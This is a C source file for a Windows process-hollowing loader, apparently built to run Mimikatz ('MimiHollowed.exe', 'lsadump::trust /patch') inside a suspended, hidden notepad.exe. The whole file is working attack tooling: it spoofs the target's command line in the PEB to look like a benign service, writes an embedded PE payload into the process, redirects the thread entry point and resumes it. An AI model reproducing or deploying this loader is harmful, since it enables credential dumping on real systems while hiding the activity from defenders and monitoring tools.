#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#include "shellcode.h"

#define MAX_NUM(a, b) a > b ? a : b;
#define MIN_NUM(a, b) a < b ? a : b;
#define MAX_INDIVIDUAL_CMDLINE_ARG_LEN 100

DWORD StrLen(PCHAR str) {
    DWORD len = 0;
    while (TRUE) {
        if (str[len] == 0) {
            return len;
        }
        else {
            len++;
        }
    }
}

void ZeroMemoryCustom(BYTE* pAddress, DWORD dwSize) {
    memset(pAddress, 0, dwSize);
}

void StrCat(PCHAR destination, PCHAR source, DWORD sourceLenMax) {
    DWORD sourceLenToCopy = MIN_NUM(StrLen(source), sourceLenMax);
    DWORD destinationLen = StrLen(destination);
    for (int i = 0; i < sourceLenToCopy; i++) {
        destination[destinationLen + i] = source[i];
    }
}

DWORD64 LoadShellcodeIntoMemory(OUT VOID** ppShellcodeStorage) {
    *ppShellcodeStorage = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (*ppShellcodeStorage == NULL) {
        printf("VirtualAlloc failed: %lu", GetLastError());
        return 0;
    }
    memcpy(*ppShellcodeStorage, shellcode, sizeof(shellcode));
    return sizeof(shellcode);
}

BOOL AdjustMemoryProtections(IN HANDLE hTargetProc, IN ULONG_PTR uBaseAddr, IN PIMAGE_NT_HEADERS pNtHeaders, IN PIMAGE_SECTION_HEADER pSectionHeaders) {

    for (DWORD nSectionIndex = 0; nSectionIndex < pNtHeaders->FileHeader.NumberOfSections; nSectionIndex++) {
        DWORD dwNewProtect = 0, dwOldProtect = 0;

        if (!pSectionHeaders[nSectionIndex].SizeOfRawData || !pSectionHeaders[nSectionIndex].VirtualAddress)
            continue;

        if (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwNewProtect = PAGE_WRITECOPY;

        if (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ)
            dwNewProtect = PAGE_READONLY;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_READWRITE;

        if (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwNewProtect = PAGE_EXECUTE;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwNewProtect = PAGE_EXECUTE_WRITECOPY;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_EXECUTE_READ;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_EXECUTE_READWRITE;

        if (!VirtualProtectEx(hTargetProc, (PVOID)(uBaseAddr + pSectionHeaders[nSectionIndex].VirtualAddress),
            pSectionHeaders[nSectionIndex].SizeOfRawData, dwNewProtect, &dwOldProtect)) {
            printf("VirtualProtectEx, error: %lu", GetLastError());
            return FALSE;
        }
    }
    return TRUE;
}

VOID DisplayProcessOutput(IN HANDLE hOutputPipe) {
    BOOL bSuccess = TRUE;
    do {
        DWORD dwBytesAvailable = 0;
        BYTE* pOutputData = NULL;

        PeekNamedPipe(hOutputPipe, NULL, NULL, NULL, &dwBytesAvailable, NULL);

        pOutputData = (BYTE*)LocalAlloc(LPTR, dwBytesAvailable);
        if (!pOutputData) break;

        if (!(bSuccess = ReadFile(hOutputPipe, pOutputData, dwBytesAvailable, NULL, NULL))) {
            LocalFree(pOutputData);
            break;
        }

        printf("%.*s", dwBytesAvailable, pOutputData);
        LocalFree(pOutputData);
    } while (bSuccess);
}

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArguments,
    OUT PPROCESS_INFORMATION pProcInfo, OUT HANDLE* phInputPipe, OUT HANDLE* phOutputPipe) {

    STARTUPINFOA stStartupInfo = { 0 };
    SECURITY_ATTRIBUTES saSecurity = { 0 };
    HANDLE hInputRead = NULL, hInputWrite = NULL, hOutputRead = NULL, hOutputWrite = NULL;
    LPSTR szFakeCommandLine = NULL;
    LPSTR szRealCommandLine = NULL;
    BOOL bResult = FALSE;

    ZeroMemory(pProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&stStartupInfo, sizeof(STARTUPINFOA));
    ZeroMemory(&saSecurity, sizeof(SECURITY_ATTRIBUTES));

    saSecurity.nLength = sizeof(SECURITY_ATTRIBUTES);
    saSecurity.bInheritHandle = TRUE;

    if (!CreatePipe(&hInputRead, &hInputWrite, &saSecurity, 0)) {
        printf("CreatePipe[1], error: %lu\n", GetLastError());
        goto CLEANUP;
    }

    if (!CreatePipe(&hOutputRead, &hOutputWrite, &saSecurity, 0)) {
        printf("CreatePipe[2], error: %lu\n", GetLastError());
        goto CLEANUP;
    }

    stStartupInfo.cb = sizeof(STARTUPINFOA);
    stStartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    stStartupInfo.wShowWindow = SW_HIDE;
    stStartupInfo.hStdInput = hInputRead;
    stStartupInfo.hStdOutput = stStartupInfo.hStdError = hOutputWrite;

    // Build fake command line (benign looking)
    char szFakeArgs[] = " -k LocalServiceNetworkRestricted";
    // char szFakeArgs[] = " /c \"echo Windows Update\"";

    size_t fakeBufferSize = strlen(szProcessPath) + strlen(szFakeArgs) + 1;
    szFakeCommandLine = (LPSTR)LocalAlloc(LPTR, fakeBufferSize);
    if (!szFakeCommandLine) {
        printf("LocalAlloc failed for fake command line: %lu\n", GetLastError());
        goto CLEANUP;
    }
    sprintf_s(szFakeCommandLine, fakeBufferSize, "%s%s", szProcessPath, szFakeArgs);

    // Build real command line
    if (szArguments && szArguments[0] != '\0') {
        size_t realBufferSize = strlen(szProcessPath) + strlen(szArguments) + 2;
        szRealCommandLine = (LPSTR)LocalAlloc(LPTR, realBufferSize);
        if (!szRealCommandLine) {
            printf("LocalAlloc failed for real command line: %lu\n", GetLastError());
            goto CLEANUP;
        }
        sprintf_s(szRealCommandLine, realBufferSize, "%s %s", szProcessPath, szArguments);
    }
    else {
        szRealCommandLine = (LPSTR)LocalAlloc(LPTR, strlen(szProcessPath) + 1);
        if (!szRealCommandLine) {
            printf("LocalAlloc failed for real command line: %lu\n", GetLastError());
            goto CLEANUP;
        }
        strcpy_s(szRealCommandLine, strlen(szProcessPath) + 1, szProcessPath);
    }

    // Create process with fake arguments using CreateProcessA
    if (!CreateProcessA(NULL, szFakeCommandLine, NULL, NULL, TRUE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &stStartupInfo, pProcInfo)) {
        printf("CreateProcessA failed: %lu\n", GetLastError());
        goto CLEANUP;
    }

    // Now spoof the command line in PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    PEB peb = { 0 };
    RTL_USER_PROCESS_PARAMETERS parameters = { 0 };

    // Get NtQueryInformationProcess
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
        printf("Failed to get NtQueryInformationProcess address: %lu\n", GetLastError());
        goto CLEANUP;
    }

    // Query process information
    NTSTATUS status = pNtQueryInformationProcess(pProcInfo->hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
    if (status != 0) {
        printf("NtQueryInformationProcess failed: 0x%lx\n", status);
        goto CLEANUP;
    }

    // Read PEB
    if (!ReadProcessMemory(pProcInfo->hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL)) {
        printf("ReadProcessMemory (PEB) failed: %lu\n", GetLastError());
        goto CLEANUP;
    }

    // Read process parameters
    if (!ReadProcessMemory(pProcInfo->hProcess, peb.ProcessParameters, &parameters, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL)) {
        printf("ReadProcessMemory (ProcessParameters) failed: %lu\n", GetLastError());
        goto CLEANUP;
    }

    // Convert real command line to wide string (PEB uses Unicode)
    int wideRealCmdLineLen = MultiByteToWideChar(CP_ACP, 0, szRealCommandLine, -1, NULL, 0);
    if (wideRealCmdLineLen == 0) {
        printf("MultiByteToWideChar (get length) failed: %lu\n", GetLastError());
        goto CLEANUP;
    }

    LPWSTR wideRealCommandLine = (LPWSTR)LocalAlloc(LPTR, wideRealCmdLineLen * sizeof(WCHAR));
    if (!wideRealCommandLine) {
        printf("LocalAlloc for wide real command line failed: %lu\n", GetLastError());
        goto CLEANUP;
    }

    if (MultiByteToWideChar(CP_ACP, 0, szRealCommandLine, -1, wideRealCommandLine, wideRealCmdLineLen) == 0) {
        printf("MultiByteToWideChar failed: %lu\n", GetLastError());
        LocalFree(wideRealCommandLine);
        goto CLEANUP;
    }

    // Write real command line to process memory
    if (!WriteProcessMemory(pProcInfo->hProcess, parameters.CommandLine.Buffer, wideRealCommandLine,
        wideRealCmdLineLen * sizeof(WCHAR), NULL)) {
        printf("WriteProcessMemory (CommandLine) failed: %lu\n", GetLastError());
        LocalFree(wideRealCommandLine);
        goto CLEANUP;
    }

    // Update command line length
    USHORT newLength = (USHORT)((wideRealCmdLineLen - 1) * sizeof(WCHAR)); // -1 to exclude null terminator
    if (!WriteProcessMemory(pProcInfo->hProcess,
        (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
        &newLength, sizeof(USHORT), NULL)) {
        printf("WriteProcessMemory (CommandLine.Length) failed: %lu\n", GetLastError());
        // Continue anyway, as the command line might still work
    }

    LocalFree(wideRealCommandLine);

    *phInputPipe = hInputWrite;
    *phOutputPipe = hOutputRead;
    bResult = TRUE;

    printf("Process created with spoofed command line\n");
    printf("Fake command line: %s\n", szFakeCommandLine);
    printf("Real command line: %s\n", szRealCommandLine);

CLEANUP:
    if (szFakeCommandLine) LocalFree(szFakeCommandLine);
    if (szRealCommandLine) LocalFree(szRealCommandLine);
    if (hInputRead) CloseHandle(hInputRead);
    if (hOutputWrite) CloseHandle(hOutputWrite);

    if (!bResult) {
        // Cleanup on failure
        if (pProcInfo->hProcess) {
            TerminateProcess(pProcInfo->hProcess, 0);
            CloseHandle(pProcInfo->hProcess);
        }
        if (pProcInfo->hThread) CloseHandle(pProcInfo->hThread);
        ZeroMemory(pProcInfo, sizeof(PROCESS_INFORMATION));
    }

    return bResult;
}

BOOL UpdateRemoteImageBase(IN HANDLE hProcess, IN ULONG_PTR uNewBaseAddr, IN ULONG_PTR uPebOffset) {
    ULONG_PTR uPebImageBaseField = uPebOffset + offsetof(PEB, Reserved3[1]);
    SIZE_T dwBytesWritten = 0;

    if (!WriteProcessMemory(hProcess, (PVOID)uPebImageBaseField, &uNewBaseAddr,
        sizeof(ULONG_PTR), &dwBytesWritten) || dwBytesWritten != sizeof(ULONG_PTR)) {
        printf("WriteProcessMemory, error: %lu", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL DeployPayload(IN BYTE* pPayloadData, IN LPCSTR szTargetPath, IN OPTIONAL LPCSTR szCmdArgs) {

    if (!pPayloadData || !szTargetPath) return FALSE;

    PROCESS_INFORMATION stProcInfo = { 0 };
    CONTEXT ctxThread = { .ContextFlags = CONTEXT_ALL };
    HANDLE hInputPipe = NULL, hOutputPipe = NULL;
    BYTE* pRemoteMem = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_SECTION_HEADER pSections = NULL;
    SIZE_T dwBytesWritten = 0;
    BOOL bSuccess = FALSE;

    if (!SpawnSuspendedProcess(szTargetPath, szCmdArgs, &stProcInfo, &hInputPipe, &hOutputPipe))
        goto CLEANUP;

    pNtHeaders = (PIMAGE_NT_HEADERS)(pPayloadData + ((PIMAGE_DOS_HEADER)pPayloadData)->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT headers\n, error: %lu", GetLastError());
        goto CLEANUP;
    }

    pRemoteMem = (BYTE*)VirtualAllocEx(stProcInfo.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) {
        printf("VirtualAllocEx, error: %lu", GetLastError());
        goto CLEANUP;
    }

    if (pRemoteMem != (BYTE*)pNtHeaders->OptionalHeader.ImageBase) {
        printf("[!] Relocation required (unsupported)\n, error: %lu", GetLastError());
        goto CLEANUP;
    }

    if (!WriteProcessMemory(stProcInfo.hProcess, pRemoteMem, pPayloadData,
        pNtHeaders->OptionalHeader.SizeOfHeaders, &dwBytesWritten) ||
        dwBytesWritten != pNtHeaders->OptionalHeader.SizeOfHeaders) {
        printf("WriteProcessMemory, error: %lu", GetLastError());
        goto CLEANUP;
    }

    pSections = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(stProcInfo.hProcess, pRemoteMem + pSections[i].VirtualAddress,
            pPayloadData + pSections[i].PointerToRawData, pSections[i].SizeOfRawData, &dwBytesWritten) ||
            dwBytesWritten != pSections[i].SizeOfRawData) {
            printf("WriteProcessMemory, error: %lu", GetLastError());
            goto CLEANUP;
        }
    }

    if (!GetThreadContext(stProcInfo.hThread, &ctxThread)) {
        printf("GetThreadContext, error: %lu", GetLastError());
        goto CLEANUP;
    }

    if (!UpdateRemoteImageBase(stProcInfo.hProcess, (ULONG_PTR)pRemoteMem, ctxThread.Rdx))
        goto CLEANUP;

    if (!AdjustMemoryProtections(stProcInfo.hProcess, (ULONG_PTR)pRemoteMem, pNtHeaders, pSections))
        goto CLEANUP;

    ctxThread.Rcx = (DWORD64)(pRemoteMem + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    if (!SetThreadContext(stProcInfo.hThread, &ctxThread)) {
        printf("SetThreadContext, error: %lu", GetLastError());
        goto CLEANUP;
    }

    if (ResumeThread(stProcInfo.hThread) == (DWORD)-1) {
        printf("ResumeThread, error: %lu", GetLastError());
        goto CLEANUP;
    }

    WaitForSingleObject(stProcInfo.hProcess, INFINITE);
    DisplayProcessOutput(hOutputPipe);
    bSuccess = TRUE;

CLEANUP:
    if (hInputPipe) CloseHandle(hInputPipe);
    if (hOutputPipe) CloseHandle(hOutputPipe);
    if (stProcInfo.hProcess) CloseHandle(stProcInfo.hProcess);
    if (stProcInfo.hThread) CloseHandle(stProcInfo.hThread);
    return bSuccess;
}

#define TARGET_APP_PATH "C:\\Windows\\System32\\notepad.exe"

int main(int argc, char* argv[]) {
    /*
        DUMMY USAGE EXAMPLE: MimiHollowed.exe coffee "lsadump::trust /patch" coffee (you can wrap any command in double quotes if it contains spaces)
    */
    BYTE* pPayloadData = NULL;
    DWORD dwPayloadSize = LoadShellcodeIntoMemory((VOID**)&pPayloadData);
    CHAR* pPeArgs = NULL;

    if (!dwPayloadSize) return -1;

    if (argc > 1) {
        DWORD sPeArgsLen = 0;
        for (int i = 1; i < argc; i++) {
            PCHAR arg = argv[i];
            DWORD argLen = StrLen(arg);
            BOOL hasSpace = FALSE;

            // Separate each argument by the introduced double quotes
            if (argLen >= 2 && arg[0] == '\"' && arg[argLen - 1] == '\"') {
                sPeArgsLen += argLen;
            }
            else {
                for (DWORD j = 0; j < argLen; j++) {
                    if (arg[j] == ' ') hasSpace = TRUE;
                }
                if (hasSpace) sPeArgsLen += argLen + 2; // Add quotes
                else sPeArgsLen += argLen;
            }
            sPeArgsLen += 1; // Space between arguments
        }
        sPeArgsLen += 6; // " exit " and null terminator

        pPeArgs = VirtualAlloc(NULL, sPeArgsLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (!pPeArgs) {
            printf("\n[-] VirtualAlloc Failed with error %d\n", GetLastError());
            return EXIT_FAILURE;
        }
        ZeroMemoryCustom(pPeArgs, sPeArgsLen);

        // Process each argument
        for (int i = 1; i < argc; i++) {
            PCHAR arg = argv[i];
            DWORD argLen = StrLen(arg);
            CHAR processedArg[MAX_INDIVIDUAL_CMDLINE_ARG_LEN + 3] = { 0 }; // +3 for quotes and null

            BOOL hasSpace = FALSE;
            for (DWORD j = 0; j < argLen; j++) {
                if (arg[j] == ' ') hasSpace = TRUE;
            }
            if (hasSpace) {
                processedArg[0] = '"';
                memcpy(processedArg + 1, arg, argLen);
                processedArg[argLen + 1] = '"';
            }
            else {
                memcpy(processedArg, arg, argLen);
            }

            StrCat(pPeArgs, processedArg, MAX_INDIVIDUAL_CMDLINE_ARG_LEN);
            if (i < argc - 1) {
                StrCat(pPeArgs, " ", 1);
            }
        }

        // Append "exit"
        StrCat(pPeArgs, " exit ", 6);
    }
    else {
        pPeArgs = "coffee exit";
    }

    return DeployPayload(pPayloadData, TARGET_APP_PATH, pPeArgs) ? EXIT_SUCCESS : EXIT_FAILURE;
}